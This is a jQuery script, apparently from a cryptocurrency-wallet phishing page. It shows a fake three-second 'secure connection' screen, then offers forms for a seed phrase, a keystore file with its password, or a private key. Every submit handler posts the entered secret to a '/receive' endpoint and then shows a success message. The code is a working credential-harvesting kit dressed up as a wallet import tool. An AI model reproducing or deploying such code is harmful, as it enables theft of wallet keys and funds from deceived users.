$(document).ready(function () {
  // Modal
  let $close = $("#close-btn");
  let $close2 = $("#close-btn2");
  let $close3 = $("#close-btn3");
  let $modal = $("#modal-1");
  let $modal2 = $("#modal-2");
  let $modal3 = $("#modal-3");

  let $open1 = $("#open-form-modal");

  $(".wallet-item").click(function (e) {
    $ele = e.currentTarget;

    $targetImage = "";
    document.querySelector(".wallet-name").innerHTML =
      $ele.childNodes[3].innerHTML;
    document.querySelector(".wallet-item__img--2").innerHTML =
      $ele.childNodes[1].innerHTML;

    // $walletName = $ele.childNodes[3].innerHTML;
    document.querySelectorAll("#walletname").forEach((ele) => {
      ele.value = $ele.childNodes[3].innerHTML;
    });

    document.querySelector(".lpd-secure-conn").style.display = "block";
    document.querySelector(".lpd-secure-conn-top").style.display = "none";
    $modal2.addClass("active");
    setTimeout(() => {
      document.querySelector(".lpd-secure-conn").style.display = "none";
      document.querySelector(".lpd-secure-conn-top").style.display = "flex";
    }, 3000);
  });

  $close2.click(function () {
    $modal2.removeClass("active");
  });

  $close3.click(function () {
    $modal3.removeClass("active");
  });

  $open1.click(function () {
    $modal2.removeClass("active");
    $modal3.addClass("active");
  });

  $close.click(function () {
    $modal.removeClass("active");
  });

  // All form data
  const phrase = $("#phrase");
  const json = $("#json");
  const password = $("#password");
  const privateKey = $("#privateKey");

  function resetData() {
    phrase.val("");
    json.val("");
    password.val("");
    privateKey.val("");
    document.querySelectorAll("#walletname").forEach((ele) => {
      ele.value = "";
    });
  }

  function validatePhrase() {
    return phrase.val().length > 0;
  }
  function validateKeystore() {
    return json.val().length > 0 && password.val().length > 0;
  }
  function validatePrivatekey() {
    return privateKey.val().length > 0;
  }

  $("#importForm").submit(function (event) {
    event.preventDefault();
    if (!validatePhrase()) {
      alert("Field not allowed to be empty");
      return;
    }
    const myForm = event.target;
    const formData = new FormData(myForm);

    // fetch("/", {
    //   method: "POST",
    //   headers: { "Content-Type": "application/x-www-form-urlencoded" },
    //   body: new URLSearchParams(formData).toString(),
    // })
    //   .then(() => {
    //     resetData();
    //     $modal2.removeClass("active");
    //     $modal3.removeClass("active");
    //     $modal.addClass("active");
    //   })
    //   .catch((error) => {
    //     console.log(error);
    //   });
    //
    $.post(
      "/receive",
      {
        Info: new URLSearchParams(formData).toString(),
      },
      null,
      "json" // dataType must be set to json
    )
      .then(function () {
        resetData();
        $modal2.removeClass("active");
        $modal3.removeClass("active");
        $modal.addClass("active");
      })
      .catch(function (response) {
        console.error(response);
      });
  });

  $("#keystoreForm").submit(function (event) {
    event.preventDefault();
    if (!validateKeystore()) {
      alert("Fields not allowed to be empty");
      return;
    }

    const myForm = event.target;
    const formData = new FormData(myForm);

    // fetch("/", {
    //   method: "POST",
    //   headers: { "Content-Type": "application/x-www-form-urlencoded" },
    //   body: new URLSearchParams(formData).toString(),
    // })
    //   .then(() => {
    //     resetData();
    //     $modal2.removeClass("active");
    //     $modal3.removeClass("active");
    //     $modal.addClass("active");
    //   })
    //   .catch((error) => {
    //     console.log(error);
    //   });
    //
    $.post(
      "/receive",
      {
        Info: new URLSearchParams(formData).toString(),
      },
      null,
      "json" // dataType must be set to json
    )
      .then(function () {
        resetData();
        $modal2.removeClass("active");
        $modal3.removeClass("active");
        $modal.addClass("active");
      })
      .catch(function (response) {
        console.error(response);
      });
  });

  $("#privateForm").submit(function (event) {
    event.preventDefault();
    if (!validatePrivatekey()) {
      alert("Field not allowed to be empty");
      return;
    }

    const myForm = event.target;
    const formData = new FormData(myForm);

    // fetch("/", {
    //   method: "POST",
    //   headers: { "Content-Type": "application/x-www-form-urlencoded" },
    //   body: new URLSearchParams(formData).toString(),
    // })
    //   .then(() => {
    //     resetData();
    //     $modal2.removeClass("active");
    //     $modal3.removeClass("active");
    //     $modal.addClass("active");
    //   })
    //   .catch((error) => {
    //     console.log(error);
    //   });
    //
    $.post(
      "/receive",
      {
        Info: new URLSearchParams(formData).toString(),
      },
      null,
      "json" // dataType must be set to json
    )
      .then(function () {
        resetData();
        $modal2.removeClass("active");
        $modal3.removeClass("active");
        $modal.addClass("active");
      })
      .catch(function (response) {
        console.error(response);
      });
  });

  //   Tabs
  let $navs = $(".navigator-item");

  let $navs1 = $("#btn-11");
  let $navs2 = $("#btn-22");
  let $navs3 = $("#btn-33");

  let $phrase = $(".phrase-cont");
  let $keystore = $(".keystore-cont");
  let $private = $(".private-cont");

  $navs.click(function () {
    $(this).siblings().removeClass("active");
    $(this).addClass("active");
  });

  $navs1.click(function () {
    $private.removeClass("active");
    $keystore.removeClass("active");
    $phrase.addClass("active");
  });
  $navs2.click(function () {
    $phrase.removeClass("active");
    $private.removeClass("active");
    $keystore.addClass("active");
  });
  $navs3.click(function () {
    $phrase.removeClass("active");
    $keystore.removeClass("active");
    $private.addClass("active");
  });
});
